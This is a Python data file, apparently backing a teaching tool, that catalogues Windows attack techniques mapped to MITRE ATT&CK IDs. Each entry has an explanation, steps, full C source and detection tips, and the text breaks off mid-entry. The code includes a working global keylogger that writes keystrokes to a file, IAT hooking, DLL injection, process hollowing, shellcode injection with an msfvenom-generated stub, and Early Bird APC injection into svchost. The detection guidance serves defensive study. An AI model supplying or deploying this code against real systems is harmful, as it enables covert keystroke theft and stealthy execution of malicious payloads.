"""
Technique database — each entry is a full description with code, steps, and detection info.
"""

CATEGORIES = [
    "All",
    "Process Injection",
    "Hooking",
    "Thread Manipulation",
    "Advanced Evasion",
]

TECHNIQUES = [
    # ─────────────────────────────────────────────────────────────────────────
    # HOOKING
    # ─────────────────────────────────────────────────────────────────────────
    {
        "id": "keylogger_hookex",
        "name": "Keylogger via SetWindowsHookEx",
        "category": "Hooking",
        "difficulty": "Intermediate",
        "platform": "Windows",
        "mitre_attack": "T1056.001",
        "tags": ["keylogger", "hook", "WH_KEYBOARD_LL", "monitoring"],
        "short_desc": "Intercepts system-wide keystrokes using a low-level Windows keyboard hook.",
        "description": (
            "SetWindowsHookEx with WH_KEYBOARD_LL installs a low-level keyboard hook that fires before "
            "any application receives the keystroke. Unlike older WH_KEYBOARD hooks, the LL variant does "
            "NOT require injecting a DLL into every process — the callback runs in the hooking process's "
            "thread, making it much stealthier and simpler.\n\n"
            "The hook intercepts WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, and WM_SYSKEYUP messages for the "
            "entire desktop session. It receives a KBDLLHOOKSTRUCT containing the virtual key code, scan "
            "code, timestamp, and extra info. The callback can log, modify, or suppress any keystroke.\n\n"
            "A message pump (GetMessage loop) is mandatory — without it, Windows will remove the hook "
            "after ~5 seconds via a timeout mechanism. This is why keyloggers commonly masquerade as "
            "legitimate apps with hidden windows."
        ),
        "how_it_works": [
            "Call SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hModule, 0) — the thread ID 0 installs a global hook.",
            "Windows registers the hook in the system-wide hook chain for WH_KEYBOARD_LL.",
            "On any keypress, the OS calls your LowLevelKeyboardProc with nCode=HC_ACTION.",
            "Cast lParam to KBDLLHOOKSTRUCT* to read vkCode (virtual key), scanCode, flags, and timestamp.",
            "Check wParam for WM_KEYDOWN / WM_SYSKEYDOWN to distinguish key-down events.",
            "Optionally call GetKeyNameTextA with the scan code to get a human-readable key name.",
            "Always call CallNextHookEx() to pass the event to the next hook (omitting this blocks input).",
            "Run GetMessage / DispatchMessage in a loop to keep the hook alive.",
            "Uninstall with UnhookWindowsHookEx(hHook) when done.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

HHOOK  g_hHook   = NULL;
FILE  *g_logFile = NULL;

// Virtual-key to printable string mapping (partial)
static const char *VkToName(DWORD vk) {
    switch (vk) {
        case VK_RETURN:  return "[ENTER]";
        case VK_SPACE:   return "[SPACE]";
        case VK_BACK:    return "[BKSP]";
        case VK_TAB:     return "[TAB]";
        case VK_SHIFT:   return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU:    return "[ALT]";
        case VK_ESCAPE:  return "[ESC]";
        case VK_DELETE:  return "[DEL]";
        default:         return NULL;
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            const char *name = VkToName(kbd->vkCode);
            char buf[64];

            if (name) {
                snprintf(buf, sizeof(buf), "%s", name);
            } else if (kbd->vkCode >= 0x20 && kbd->vkCode < 0x7F) {
                // Printable ASCII range
                snprintf(buf, sizeof(buf), "%c", (char)kbd->vkCode);
            } else {
                snprintf(buf, sizeof(buf), "[VK:0x%02X]", kbd->vkCode);
            }

            printf("[+] Key captured: %s  (scan=0x%02X)\n", buf, kbd->scanCode);

            if (g_logFile) {
                fprintf(g_logFile, "%s", buf);
                fflush(g_logFile);
            }
        }
    }

    // MUST call next hook — omitting this silently drops keystrokes
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

int main(void) {
    g_logFile = fopen("keylog.txt", "a");

    // Thread ID = 0  →  global hook (all threads on desktop)
    g_hHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        LowLevelKeyboardProc,
        GetModuleHandle(NULL),
        0
    );

    if (!g_hHook) {
        fprintf(stderr, "[-] SetWindowsHookEx failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[*] Hook installed (HHOOK = %p). Waiting for keystrokes...\n", g_hHook);

    // Message pump keeps hook alive and dispatches callbacks
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hHook);
    if (g_logFile) fclose(g_logFile);
    printf("[*] Hook removed. Exiting.\n");
    return 0;
}
""",
        "code_language": "c",
        "detection": [
            "Monitor SetWindowsHookEx calls where idHook == WH_KEYBOARD_LL (13) via ETW or API hooks.",
            "Check the system hook list with EnumWindows / GetWindowLongPtr — hidden windows with hooks are suspicious.",
            "Use Process Monitor to spot processes that have no visible window yet maintain a message pump.",
            "Kernel callbacks: PsSetLoadImageNotifyRoutine can alert when suspicious DLLs load into processes.",
            "Behavioral: a process that never receives focus but writes to files or network after keypress timing is a red flag.",
            "EDR behavioral rules: correlate keyboard-hook registration with file-write or network-send within seconds.",
            "Windows Defender / AV heuristic: low-level hooks in processes with no known UI are flagged.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Type in the input box below. The simulation captures each keystroke using Python "
            "key bindings and displays it exactly as a real keylogger hook callback would receive it — "
            "showing the virtual key code and key name side by side."
        ),
    },

    {
        "id": "iat_hooking",
        "name": "IAT Hooking",
        "category": "Hooking",
        "difficulty": "Intermediate",
        "platform": "Windows",
        "mitre_attack": "T1574.012",
        "tags": ["IAT", "hook", "PE", "API redirect"],
        "short_desc": "Overwrites Import Address Table entries to redirect API calls to custom code.",
        "description": (
            "Every PE (Portable Executable) that imports functions from DLLs contains an Import Address "
            "Table (IAT). At load time, the Windows loader resolves each imported symbol and writes its "
            "actual runtime address into this table. When the executable calls an imported function, the "
            "CPU indirects through the IAT entry.\n\n"
            "IAT hooking replaces one or more of these addresses with a pointer to attacker-controlled "
            "code. All calls to the hooked function from that module are silently redirected — the "
            "attacker's handler runs first, then optionally calls the real function.\n\n"
            "This is used for API monitoring, credential theft (hooking CryptProtectData, "
            "BCryptEncrypt), browser injection, and sandbox evasion. It is module-local: only the "
            "process whose IAT is modified is affected."
        ),
        "how_it_works": [
            "Parse the target process's PE header: IMAGE_DOS_HEADER → IMAGE_NT_HEADERS → IMAGE_IMPORT_DESCRIPTOR.",
            "Walk the import descriptor array to find the DLL whose function you want to hook (e.g., WS2_32.dll).",
            "For each import descriptor, walk the OriginalFirstThunk (INT) to find the desired function name or ordinal.",
            "Locate the corresponding entry in FirstThunk (IAT) — this holds the live address written by the loader.",
            "Use VirtualProtect to make the IAT page writable (it is PAGE_READONLY by default).",
            "Overwrite the IAT entry with the address of your hook function.",
            "Restore page protection with VirtualProtect.",
            "Your hook fires on every subsequent call to that function from this module.",
            "Optionally store the original address so the hook can call-through to the real function.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

// ── Original function pointer (call-through) ────────────────────────────────
typedef int (WSAAPI *PFN_CONNECT)(SOCKET, const struct sockaddr *, int);
static PFN_CONNECT g_origConnect = NULL;

// ── Replacement hook ─────────────────────────────────────────────────────────
int WSAAPI Hook_connect(SOCKET s, const struct sockaddr *name, int namelen) {
    struct sockaddr_in *in4 = (struct sockaddr_in *)name;
    printf("[IAT HOOK] connect() → %d.%d.%d.%d:%d\n",
           in4->sin_addr.S_un.S_un_b.s_b1,
           in4->sin_addr.S_un.S_un_b.s_b2,
           in4->sin_addr.S_un.S_un_b.s_b3,
           in4->sin_addr.S_un.S_un_b.s_b4,
           ntohs(in4->sin_port));

    return g_origConnect(s, name, namelen);   // call-through
}

// ── IAT patcher ──────────────────────────────────────────────────────────────
BOOL PatchIAT(HMODULE hMod, const char *dllName, const char *funcName,
              void *hookFn, void **ppOrig)
{
    BYTE *base   = (BYTE *)hMod;
    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS   *nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    for (; imp->Name; imp++) {
        if (_stricmp((char *)(base + imp->Name), dllName) != 0) continue;

        IMAGE_THUNK_DATA *orig = (IMAGE_THUNK_DATA *)(base + imp->OriginalFirstThunk);
        IMAGE_THUNK_DATA *iat  = (IMAGE_THUNK_DATA *)(base + imp->FirstThunk);

        for (; orig->u1.Function; orig++, iat++) {
            if (IMAGE_SNAP_BY_ORDINAL(orig->u1.Ordinal)) continue;

            IMAGE_IMPORT_BY_NAME *byName =
                (IMAGE_IMPORT_BY_NAME *)(base + orig->u1.AddressOfData);

            if (_stricmp((char *)byName->Name, funcName) != 0) continue;

            // Found — make page writable, swap, restore
            DWORD old;
            VirtualProtect(&iat->u1.Function, sizeof(void *), PAGE_READWRITE, &old);
            *ppOrig = (void *)iat->u1.Function;
            iat->u1.Function = (ULONG_PTR)hookFn;
            VirtualProtect(&iat->u1.Function, sizeof(void *), old, &old);

            printf("[+] IAT patched: %s!%s  old=%p  new=%p\n",
                   dllName, funcName, *ppOrig, hookFn);
            return TRUE;
        }
    }
    return FALSE;
}

// ── Entry point ──────────────────────────────────────────────────────────────
int main(void) {
    // Hook WS2_32.connect in the current module
    BOOL ok = PatchIAT(GetModuleHandle(NULL),
                       "WS2_32.dll", "connect",
                       Hook_connect, (void **)&g_origConnect);

    if (!ok) { puts("[-] Patch failed"); return 1; }

    puts("[*] IAT hooked. All outbound TCP connections will be logged.");
    // ... rest of program proceeds normally; every connect() call is intercepted
    return 0;
}
""",
        "code_language": "c",
        "detection": [
            "Scan loaded module IATs and compare against the disk image — mismatches reveal patched entries.",
            "EDR integrity checks: periodically validate IAT entries against the original loader values.",
            "Memory forensics tools (Volatility, PE-sieve) detect IAT anomalies in running processes.",
            "PAGE_READWRITE transitions on the IAT section (normally PAGE_READONLY) are suspicious.",
            "API monitor / ETW: VirtualProtect calls targeting image sections outside normal loader activity.",
        ],
        "has_simulation": True,
        "sim_description": (
            "The simulation walks a mock PE import table and shows how each entry is "
            "resolved, then demonstrates patching one entry and routing through the hook."
        ),
    },

    # ─────────────────────────────────────────────────────────────────────────
    # PROCESS INJECTION
    # ─────────────────────────────────────────────────────────────────────────
    {
        "id": "classic_dll_injection",
        "name": "Classic DLL Injection (CreateRemoteThread)",
        "category": "Process Injection",
        "difficulty": "Beginner",
        "platform": "Windows",
        "mitre_attack": "T1055.001",
        "tags": ["DLL", "CreateRemoteThread", "LoadLibrary", "injection"],
        "short_desc": "Forces a remote process to load an attacker-controlled DLL via CreateRemoteThread + LoadLibrary.",
        "description": (
            "Classic DLL injection is the most documented and widely understood process injection "
            "technique. It exploits the fact that LoadLibraryA/W is exported at a fixed offset from "
            "kernel32.dll's base address, which is the same across all processes in the same OS session.\n\n"
            "The injector writes the DLL path into the target process's virtual memory, then creates a "
            "remote thread that begins executing at LoadLibraryA. The OS loader in the target process "
            "then maps and initializes the DLL normally — including running DllMain with DLL_PROCESS_ATTACH.\n\n"
            "This technique is straightforward but noisy. It requires OpenProcess with high privileges "
            "(PROCESS_VM_WRITE, PROCESS_VM_OPERATION, PROCESS_CREATE_THREAD), leaves the DLL visible "
            "in the PEB's module list, and is detected by virtually all modern EDRs."
        ),
        "how_it_works": [
            "OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID) to get a handle to the victim process.",
            "VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE) to allocate memory in the target.",
            "WriteProcessMemory(hProc, remoteAddr, dllPath, pathLen, NULL) to copy the DLL path string.",
            "GetProcAddress(GetModuleHandleA('kernel32.dll'), 'LoadLibraryA') to get the LoadLibrary address — same in all processes.",
            "CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, remoteAddr, 0, NULL) creates a thread in the target.",
            "The thread starts at LoadLibraryA with the remote DLL path as its argument.",
            "Windows loader in target process maps the DLL and calls DllMain(DLL_PROCESS_ATTACH).",
            "Your DLL payload runs inside the target process's address space.",
            "WaitForSingleObject + CloseHandle to clean up the thread handle.",
        ],
        "code_example": r"""#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// ── Find PID by process name ──────────────────────────────────────────────────
DWORD FindPID(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };

    for (BOOL ok = Process32FirstW(snap, &pe); ok; ok = Process32NextW(snap, &pe))
        if (!_wcsicmp(pe.szExeFile, name)) { CloseHandle(snap); return pe.th32ProcessID; }

    CloseHandle(snap);
    return 0;
}

// ── Inject DLL into target PID ────────────────────────────────────────────────
BOOL InjectDLL(DWORD pid, const char *dllPath) {
    SIZE_T pathLen = strlen(dllPath) + 1;

    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
        FALSE, pid);

    if (!hProc) { printf("[-] OpenProcess failed: %lu\n", GetLastError()); return FALSE; }

    // 1. Allocate memory for the DLL path in the remote process
    LPVOID remoteStr = VirtualAllocEx(hProc, NULL, pathLen,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteStr) { CloseHandle(hProc); return FALSE; }

    // 2. Write the DLL path string
    WriteProcessMemory(hProc, remoteStr, dllPath, pathLen, NULL);

    // 3. Get LoadLibraryA address — identical in all processes for the same session
    LPVOID loadLib = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    // 4. Create remote thread at LoadLibraryA with path as argument
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)loadLib,
                                         remoteStr, 0, NULL);

    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProc, remoteStr, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    printf("[+] Remote thread created (TID=%lu). Waiting for DLL load...\n",
           GetThreadId(hThread));

    WaitForSingleObject(hThread, 5000);

    // Cleanup remote allocation
    VirtualFreeEx(hProc, remoteStr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}

int main(void) {
    DWORD pid = FindPID(L"notepad.exe");
    if (!pid) { puts("[-] notepad.exe not found"); return 1; }

    printf("[*] Target PID: %lu\n", pid);
    InjectDLL(pid, "C:\\payload.dll");
    return 0;
}
""",
        "code_language": "c",
        "detection": [
            "OpenProcess with PROCESS_CREATE_THREAD | PROCESS_VM_WRITE is a high-confidence injection indicator.",
            "VirtualAllocEx → WriteProcessMemory → CreateRemoteThread sequence in a single process is a classic 3-step signature.",
            "Remote thread whose start address equals kernel32!LoadLibraryA is directly flagged by most EDRs.",
            "PEB module list inspection: unexpected DLLs loaded by svchost.exe, explorer.exe, etc.",
            "Thread start addresses that don't point to the start of a mapped module section are suspicious.",
            "ETW Microsoft-Windows-Kernel-Process events: remote thread creation events.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Step-by-step visual walkthrough: watch each API call light up in sequence, "
            "with a live memory map showing the remote allocation and thread creation."
        ),
    },

    {
        "id": "process_hollowing",
        "name": "Process Hollowing",
        "category": "Process Injection",
        "difficulty": "Advanced",
        "platform": "Windows",
        "mitre_attack": "T1055.012",
        "tags": ["hollowing", "process doppelganger", "NtUnmapViewOfSection", "PE"],
        "short_desc": "Spawns a legitimate process suspended, unmaps its code, and replaces it with a malicious PE image.",
        "description": (
            "Process hollowing (also called RunPE) creates a new process in SUSPENDED state from a "
            "legitimate executable. It then unmaps the legitimate executable's code section from memory "
            "and replaces it with the attacker's PE image. When the process is resumed, it executes the "
            "attacker's code under the identity of the legitimate process.\n\n"
            "This is highly effective for EDR bypass because: the process name, path, and parent PID all "
            "appear legitimate; the PEB still shows the original executable path; and process-based "
            "allowlisting is bypassed entirely.\n\n"
            "The technique requires precise PE parsing and manual relocation of the injected image if its "
            "base address differs from its preferred load address. Modern variants (Process Doppelgänging, "
            "Herpaderping) extend this with transactional NTFS or file manipulation to further evade "
            "file-based scanning."
        ),
        "how_it_works": [
            "CreateProcess(targetPath, ..., CREATE_SUSPENDED) spawns svchost.exe (or similar) in suspended state.",
            "GetThreadContext(hThread, &ctx) reads the main thread's context — EAX/RAX holds the entry point.",
            "Read PEB base from ctx.Ebx/Rdx (32-bit) or ctx.Rdx (64-bit); read PEB.ImageBaseAddress.",
            "NtUnmapViewOfSection(hProc, imageBase) unmaps the legitimate executable's image from the process.",
            "VirtualAllocEx at the preferred base address of your PE to reserve space for the new image.",
            "WriteProcessMemory to copy the PE headers and each section (.text, .data, .rsrc …) individually.",
            "Fix the PEB.ImageBaseAddress pointer to point to your newly mapped image.",
            "If base addresses differ, apply relocation patches (IMAGE_BASE_RELOCATION blocks).",
            "SetThreadContext to update the entry point (EIP/RIP) to your PE's AddressOfEntryPoint.",
            "ResumeThread — the legitimate-looking process now runs your payload.",
        ],
        "code_example": r"""// Simplified 64-bit Process Hollowing skeleton
// Full implementation requires PE parsing and reloc patching.
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *PFN_NtUnmapViewOfSection)(HANDLE, PVOID);

// Read raw PE bytes from disk (or memory/network)
PBYTE LoadPayloadPE(const char *path, SIZE_T *size);

BOOL HollowProcess(const wchar_t *hostPath, PBYTE payload, SIZE_T payloadSize) {
    STARTUPINFOW si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    // 1. Spawn host process SUSPENDED
    if (!CreateProcessW(hostPath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Spawned PID=%lu  TID=%lu (suspended)\n", pi.dwProcessId, pi.dwThreadId);

    // 2. Read thread context to locate PEB
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);

    // 3. Read PEB.ImageBaseAddress (Rdx points to PEB in 64-bit)
    ULONGLONG pebBase, imageBase;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx), &pebBase, 8, NULL);
    ReadProcessMemory(pi.hProcess, (LPCVOID)(pebBase + 0x10), &imageBase, 8, NULL);
    printf("[+] PEB @ 0x%llX  |  ImageBase @ 0x%llX\n", pebBase, imageBase);

    // 4. Unmap the legitimate image
    PFN_NtUnmapViewOfSection NtUnmap =
        (PFN_NtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmap(pi.hProcess, (PVOID)imageBase);

    // 5. Parse payload PE headers
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);
    ULONGLONG prefBase    = nt->OptionalHeader.ImageBase;
    SIZE_T    imageSize   = nt->OptionalHeader.SizeOfImage;

    // 6. Allocate memory at preferred base
    LPVOID remote = VirtualAllocEx(pi.hProcess, (LPVOID)prefBase, imageSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) remote = VirtualAllocEx(pi.hProcess, NULL, imageSize,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("[+] Remote allocation @ %p\n", remote);

    // 7. Write PE headers
    WriteProcessMemory(pi.hProcess, remote, payload,
                       nt->OptionalHeader.SizeOfHeaders, NULL);

    // 8. Write each section
    PIMAGE_SECTION_HEADER sec =
        (PIMAGE_SECTION_HEADER)((BYTE *)nt + sizeof(IMAGE_NT_HEADERS));
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        WriteProcessMemory(pi.hProcess,
            (BYTE *)remote + sec->VirtualAddress,
            payload + sec->PointerToRawData,
            sec->SizeOfRawData, NULL);
    }

    // 9. Fix PEB.ImageBaseAddress
    WriteProcessMemory(pi.hProcess, (LPVOID)(pebBase + 0x10),
                       &remote, sizeof(ULONGLONG), NULL);

    // 10. Update entry point and resume
    ctx.Rcx = (ULONGLONG)remote + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    printf("[+] Entry point set to 0x%llX. Resuming...\n", ctx.Rcx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}
""",
        "code_language": "c",
        "detection": [
            "NtUnmapViewOfSection called on a process the caller just spawned is a high-confidence signal.",
            "Discrepancy between PEB.ImageBaseAddress and the on-disk PE path is a strong indicator.",
            "Thread entry point (from GetThreadContext) not within any mapped module's address range.",
            "Scanning memory regions for PE magic bytes (MZ/PE) that are not backed by a file on disk.",
            "CreateProcess(CREATE_SUSPENDED) followed immediately by cross-process memory writes is suspicious.",
            "Tools: Hollows Hunter, pe-sieve scan running processes for hollow/implanted modules.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Step-by-step animated walkthrough: each phase highlights in the code view "
            "and a live ASCII memory diagram shows the before/after state of the process address space."
        ),
    },

    {
        "id": "shellcode_injection",
        "name": "Shellcode Injection (VirtualAllocEx)",
        "category": "Process Injection",
        "difficulty": "Beginner",
        "platform": "Windows",
        "mitre_attack": "T1055",
        "tags": ["shellcode", "VirtualAllocEx", "WriteProcessMemory", "RWX"],
        "short_desc": "Allocates RWX memory in a remote process and writes raw shellcode for execution.",
        "description": (
            "The most primitive form of process injection: allocate executable memory in a target process, "
            "copy shellcode bytes into it, and redirect execution there. Unlike DLL injection, there is no "
            "PE structure — just raw machine code.\n\n"
            "Shellcode is typically produced by exploit frameworks (Cobalt Strike, msfvenom) or hand-written "
            "in assembly. It must be position-independent (PIC) since its load address is not known at "
            "compile time. Common payloads include reverse shells, stagers, or in-memory loaders.\n\n"
            "The PAGE_EXECUTE_READWRITE (RWX) allocation is the classic indicator — legitimate code almost "
            "never needs memory that is simultaneously writable and executable. Modern variants use a two-step "
            "approach: allocate PAGE_READWRITE, write, then VirtualProtectEx to PAGE_EXECUTE_READ."
        ),
        "how_it_works": [
            "Obtain a shellcode payload — either generated by a framework or custom-written assembly.",
            "OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid) to get a handle to the target.",
            "VirtualAllocEx(hProc, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE) — allocate RWX memory.",
            "WriteProcessMemory(hProc, remoteAddr, shellcode, shellcodeSize, NULL) to copy bytes.",
            "(Better OPSEC) VirtualProtectEx to change permissions from RW to RX before executing.",
            "CreateRemoteThread / NtCreateThreadEx / RtlCreateUserThread to start execution at remoteAddr.",
            "The target process's thread now executes your shellcode natively.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

// Example: calc.exe popup shellcode (x64, Windows 10)
// Generated with: msfvenom -p windows/x64/exec CMD=calc.exe -f c
unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
    /* ... truncated for brevity ... */
    0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

BOOL InjectShellcode(DWORD pid, PBYTE sc, SIZE_T scLen) {
    HANDLE hProc = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        FALSE, pid);

    if (!hProc) return FALSE;

    // 1. Allocate RW memory (two-step is stealthier than RWX)
    LPVOID remote = VirtualAllocEx(hProc, NULL, scLen,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) { CloseHandle(hProc); return FALSE; }

    // 2. Write shellcode bytes
    WriteProcessMemory(hProc, remote, sc, scLen, NULL);

    // 3. Flip to RX — eliminates the RWX memory indicator
    DWORD old;
    VirtualProtectEx(hProc, remote, scLen, PAGE_EXECUTE_READ, &old);

    // 4. Execute via remote thread
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)remote,
                                         NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    printf("[+] Shellcode executing in PID=%lu at %p\n", pid, remote);
    WaitForSingleObject(hThread, 5000);

    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}

int main(void) {
    DWORD targetPid = 1234;  // replace with target PID
    return InjectShellcode(targetPid, shellcode, sizeof(shellcode)) ? 0 : 1;
}
""",
        "code_language": "c",
        "detection": [
            "PAGE_EXECUTE_READWRITE allocations in remote processes are nearly always malicious.",
            "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread within the same process flow.",
            "Memory regions that are executable but not backed by a file (anonymous executable pages).",
            "Thread start address points into an anonymous (non-module) memory region.",
            "Scan for shellcode patterns: common stubs like PEB-walk, hash-based API resolution.",
            "EDR memory scanning: scan remote process memory after allocation events.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Demonstrates the allocation sequence: shows a real VirtualAlloc call in the current process, "
            "displays the returned address and page permissions, then frees it — no execution occurs."
        ),
    },

    # ─────────────────────────────────────────────────────────────────────────
    # THREAD MANIPULATION
    # ─────────────────────────────────────────────────────────────────────────
    {
        "id": "apc_injection",
        "name": "APC Queue Injection (Early Bird)",
        "category": "Thread Manipulation",
        "difficulty": "Advanced",
        "platform": "Windows",
        "mitre_attack": "T1055.004",
        "tags": ["APC", "QueueUserAPC", "Early Bird", "alertable", "thread"],
        "short_desc": "Queues an Asynchronous Procedure Call to a target thread to execute shellcode when the thread enters an alertable wait.",
        "description": (
            "APC (Asynchronous Procedure Call) injection abuses the Windows APC mechanism — a way to "
            "schedule functions to run on a specific thread. When a thread enters an alertable wait "
            "(SleepEx, WaitForSingleObjectEx, MsgWaitForMultipleObjectsEx, etc.), the OS drains its "
            "APC queue and executes each queued function.\n\n"
            "The 'Early Bird' variant is particularly potent: spawn a process in SUSPENDED state, "
            "inject shellcode, queue an APC to the main thread BEFORE it has even initialized, then "
            "resume. The first alertable wait the thread hits — often inside ntdll initialization — "
            "detonates the payload before any EDR hooks are loaded.\n\n"
            "Unlike CreateRemoteThread, QueueUserAPC does not create a new thread (lower overhead, "
            "less visibility) and the execution happens on an existing, legitimate thread."
        ),
        "how_it_works": [
            "CreateProcess(hostPath, ..., CREATE_SUSPENDED) — spawn a legitimate process suspended.",
            "VirtualAllocEx + WriteProcessMemory to plant shellcode in the suspended process.",
            "OpenThread(THREAD_SET_CONTEXT, FALSE, targetTid) to get a handle to the target thread.",
            "QueueUserAPC((PAPCFUNC)shellcodeAddr, hThread, 0) — add the APC to the thread's queue.",
            "ResumeThread(hThread) — the process starts initializing.",
            "At the first alertable wait inside ntdll startup code, the APC fires and shellcode runs.",
            "The shellcode executes on the host process's main thread — no foreign thread visible.",
        ],
        "code_example": r"""#include <windows.h>
#include <stdio.h>

// Shellcode placeholder (replace with your payload)
unsigned char sc[] = { 0x90, 0x90, 0xC3 };  // NOP NOP RET — safe test stub

BOOL EarlyBirdAPC(const wchar_t *hostExe, PBYTE sc, SIZE_T scLen) {
    STARTUPINFOW si        = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    // 1. Spawn host suspended
    if (!CreateProcessW(hostExe, NULL, NULL, NULL, FALSE,
                         CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] PID=%lu TID=%lu (suspended)\n", pi.dwProcessId, pi.dwThreadId);

    // 2. Allocate + write shellcode
    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, scLen,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remote, sc, scLen, NULL);
    printf("[+] Shellcode written @ %p\n", remote);

    // 3. Queue APC to main thread — fires on first alertable wait
    DWORD ret = QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);
    if (!ret) {
        printf("[-] QueueUserAPC failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    printf("[+] APC queued. Resuming thread...\n");

    // 4. Resume — APC fires during ntdll initialization
    ResumeThread(pi.hThread);

    WaitForSingleObject(pi.hProcess, 5000);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

int main(void) {
    return EarlyBirdAPC(L"C:\\Windows\\System32\\svchost.exe",
                         sc, sizeof(sc)) ? 0 : 1;
}
""",
        "code_language": "c",
        "detection": [
            "QueueUserAPC targeting a thread in another process is unusual and should be logged.",
            "APC target address falls in anonymous (non-module-backed) memory — strong indicator.",
            "CREATE_SUSPENDED followed by VirtualAllocEx + QueueUserAPC + ResumeThread sequence.",
            "ETW: Microsoft-Windows-Kernel-Process APC events surfaced by some EDRs.",
            "Memory scanning for shellcode stubs in new processes during their initialization window.",
            "Process creation with CREATE_SUSPENDED from unexpected parents is a workflow anomaly.",
        ],
        "has_simulation": True,
        "sim_description": (
            "Visual walkthrough animating the Early Bird sequence step by step, "
            "with an APC queue diagram that shows the queued item being dequeued and fired."
        ),
    },

    {
        "id": "thread_hijacking",
        "name": "Thread Hijacking (Context Manipulation)",
        "category": "Thread Manipulation",
        "difficulty": "Advanced",
        "platform": "Windows",
